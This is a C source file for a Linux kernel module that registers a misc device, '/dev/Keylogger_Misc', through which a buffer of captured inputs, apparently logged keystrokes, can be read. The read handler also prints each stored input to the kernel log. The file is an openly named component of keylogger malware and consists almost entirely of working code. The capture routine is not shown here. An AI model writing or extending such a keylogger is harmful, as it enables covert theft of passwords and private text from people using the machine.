// SPDX-License-Identifier: GPL-2.0
#include "logger.h"

static int my_open(struct inode *node, struct file *file)
{
	printk(KERN_INFO "Misc Device number %d %d - Open function called\n", imajor(node), iminor(node));
	if (file->f_mode & FMODE_READ)
		printk(KERN_INFO "Misc Device - Open function called with read permissions\n");
	if (file->f_mode & FMODE_WRITE)
		return -EPERM;
	return 0;
}

static int my_close(struct inode *node, struct file *file)
{
	printk(KERN_INFO "Misc Device number %d %d - Close function called\n", imajor(node), iminor(node));
	return 0;
}

static ssize_t my_write(struct file *file, const char __user *user_buf, size_t user_len, loff_t *ppos)
{
	printk(KERN_INFO "Misc Device : Hello from Write : Weird thing here :)\n");
	return 0;
}

static ssize_t my_read(struct file *file, char __user *user_buf, size_t user_len, loff_t *ppos)
{
	mutex_lock(&mut);
    size_t available = (inputs.ibuf_len - *ppos);

    t_list *tmp = inputs.inputs_lst;
    while(tmp) {
        printk(KERN_INFO "%s", (char *)tmp->content);
        tmp = tmp->next;
    }

	if (*ppos >= inputs.ibuf_len) {
		mutex_unlock(&mut);
		return 0;
	}

	size_t to_copy = (user_len < (inputs.ibuf_len - *ppos)) ? user_len : (inputs.ibuf_len - *ppos);

    if (copy_to_user(user_buf, inputs.inputs_buffer + *ppos, to_copy)) {
        pr_err("Misc Device - Error copying data to userspace\n");
		mutex_unlock(&mut);
		return -EFAULT;
    }

    *ppos += to_copy;

	mutex_unlock(&mut);
    return to_copy;
}

////////////////////////////////////////////////////////////
// Misc Device Part

static const struct file_operations fops = {
	.owner = THIS_MODULE,
	.write = my_write,
	.read = my_read,
	.open = my_open,
	.release = my_close,
};

struct miscdevice my_misc = {
	.name = "Keylogger_Misc",
	.minor = MISC_DYNAMIC_MINOR,
	.fops = &fops,
};

int logger_init(void)
{
	int status = misc_register(&my_misc);

	if (status) {
		printk(KERN_ALERT "Error: misc register failed\n");
		return -status;
	}
	printk(KERN_INFO "Misc Device Registred at /dev/Keylogger_Misc\n");
	return 0;
}

EXPORT_SYMBOL(my_misc);
EXPORT_SYMBOL(logger_init);